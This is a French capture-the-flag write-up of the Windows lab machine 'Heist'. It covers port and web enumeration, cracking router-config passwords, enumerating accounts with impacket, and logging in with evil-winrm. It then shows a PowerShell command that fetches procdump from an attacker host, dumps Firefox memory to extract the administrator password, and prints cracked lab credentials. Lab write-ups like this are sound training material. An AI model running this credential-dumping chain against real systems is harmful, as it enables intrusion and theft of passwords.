![Pic1](../img/heist1.PNG?raw=true) </br>

# Introduction
Heist est une machine Windows dont l'adresse IP est 10.10.10.149.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des ports et services d'un site web.
* Enumération des utilisateurs d'une machine local windows.
* Dump d'un processus qui contient un mot de passe.
</br>

# Enumération initiale
Nous commençons par l'énumération des ports et services avec nmap :
```bash
$ nmap -T4 -A 10.10.10.149
```
![Pic2](../img/heist2.PNG?raw=true) </br>
Plusieurs ports d'ouverts. Nous allons faire une énumération des fichiers et dossiers sur le port 80 avec dirsearch :
```bash
$ dirsearch -w wordlist -e "php,txt" -f -t 100 -x 400,404,500 -u http://10.10.10.149
```
![Pic3](../img/heist3.PNG?raw=true) </br>

# Obtenir un accès utilisateur

Sur la page d'accueil du site web, nous pouvons nous connecter en tant que Guest :</br>
![Pic4](../img/heist4.PNG?raw=true) </br>
Il y a une page d'aide, qui correspond à un dialogue entre l'utilisateur Hazard et le support. L'utilisateur Hazard a des problèmes avec son routeur cisco, il a laissé une copie de la configuration :</br>
![Pic5](../img/heist5.PNG?raw=true) </br>
![Pic6](../img/heist6.PNG?raw=true) </br>
Dans le dialogue, nous aprenons qu'un compte Hazard existe sur le serveur Windows, puis dans la config du routeur, nous pouvons voir 3 mots de passe que nous allons cracker :
![Pic7](../img/heist7.PNG?raw=true) </br>
![Pic8](../img/heist8.PNG?raw=true) </br>
![Pic9](../img/heist9.PNG?raw=true) </br>
Maintenant que nous avons des mots de passe et un nom d'utilisateur, nous pouvons essayer de nous connceter sur la machine avec ces derniers. Sauf qu'il n'y a pas de port SSH d'ouvert, nous allons refaire un scan pour voir si le 
port de Winrm est ouvert :</br>
![Pic10](../img/heist10.PNG?raw=true) </br>
Le port winrm est ouvert, nous pouvons donc tenter les différentes combinaisons d'identifiant et mot de passe que nous avons en se connectant avec evil-winrm. Sauf que l'on a une erreur d'authorisation, ce qui veux dire
que le compte Hazard ne peut pas se connecter en winrm. En revanche le couple Hazard:stealthlagent nous permet de nous connecter avec smbclient. / </br>
Le script lookupsid.py de impacket nous permet d'énumérer les comptes locaux :
```bash
$ python lookupsid.py ./hazard@10.10.10.149
```
![Pic11](../img/heist11.PNG?raw=true) </br>
Plusieurs nouveau idenfitiants intéréssants : Chase / Jason / support.</br>
En essayant les mots de passes sur chacun des idenfitiants, le couple Chase:Q4)sJu\Y8qz*A3?d fonctionne avec evil-winrm et nous permet d'obtenir le fichier user.txt.</br>
![Pic12](../img/heist12.PNG?raw=true) </br>

# Obtenir un accès administrateur

Nous faisons l'énumération avec winPEAS :
```bash
evil-winrm > upload /home/parrot/DesktopwinPEASx64.exe
evil-winrm > ./winPEASx64.exe all
```
Dans l'énumération, winPEAS nous dit qu'il y a du mot de passe d'enregistré dans Firefox :</br>
![Pic13](../img/heist13.PNG?raw=true) </br>
Nous allons voir si Firefox est actif et le dumper pour voir si il contient un mot de passe autre que le notre :
```bash
evil-winrm > powershell -c "Invoke-Webrequest -Uri http://10.10.14.6:8000/procdump.exe -outfile procdump.exe"
evil-winrm > Get-Process
evil-winrm > ./procdump -ma 708
evil-winrm > powershell -c 'Get-Content firefox_dump.dmp | Select-string -Pattern "assword" '
```
![Pic14](../img/heist14.PNG?raw=true) </br>
Nous pouvons alors nous connecter en administrator et récupérer le root.txt :</br>
![Pic15](../img/heist15.PNG?raw=true) </br>